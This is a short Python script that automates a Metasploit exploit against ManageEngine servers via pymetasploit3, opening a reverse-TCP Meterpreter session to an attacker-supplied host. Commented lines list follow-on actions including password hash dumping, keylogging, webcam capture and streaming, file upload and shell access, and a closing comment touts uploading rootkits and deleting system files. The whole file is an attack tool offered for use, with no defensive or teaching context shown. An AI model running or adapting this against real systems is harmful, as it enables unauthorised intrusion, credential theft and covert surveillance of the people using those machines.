from pymetasploit3.msfrpc import *
import time


def manageengine_connectionid_write(rhosts, rport, lhosts, payload="windows/meterpreter/reverse_tcp"):
    client = MsfRpcClient('password')
    cid = client.consoles.console().cid
    x = client.modules.use('exploit', 'exploit/windows/http/manageengine_connectionid_write')
    x['RHOSTS'] = rhosts
    x['RPORT'] = rport
    client.consoles.console(cid).write("set payload " +payload)
    client.consoles.console(cid).write("set LHOST " + lhosts)
    time.sleep(3)
    jobid = x.execute(payload="windows/meterpreter/reverse_tcp")
    time.sleep(5)
    print("Got a meterpreter session. Meterpreter is even better than shell ")
    if len(client.sessions.list.keys()) ==0:
        print("Could not get a meterpreter session. Exploit failed")

    sessionid = list(client.sessions.list.keys())[0]
    shell = client.sessions.session(sessionid)
    if shell is None:
        print("Failure!")
        return None

    print(shell.run_with_output('sysinfo'))
    # print(shell.run_with_output('help'))
    # dump password hashes
    # print(shell.run_with_output('hashdump'))
    # print(shell.run_with_output('idletime'))
    # print(shell.run_with_output('ps'))
    # print(shell.run_with_output('arp'))
    # upload a file
    # print(shell.run_with_output('upload'))
    # print(shell.run_with_output('webcam_list'))
    # print(shell.run_with_output('webcam_snap'))
    # take a video
    # print(shell.run_with_output('webcam_stream'))
    # keylogging scan
    # print(shell.run_with_output('keyscan_start'))
    # shell.run_shell_cmd_with_output('whoami')
    # now I can dropping into shell access
    # print(shell.run_with_output('shell'))
    # print(shell.run_with_output('cd ../../../'))
    # print(shell.run_with_output('dir'))

    # you can upload rootkits, monitor user activity (even webcam), delete
    # system files, get the password hashes, etc with this shell.
    # shell.stop()
    return shell
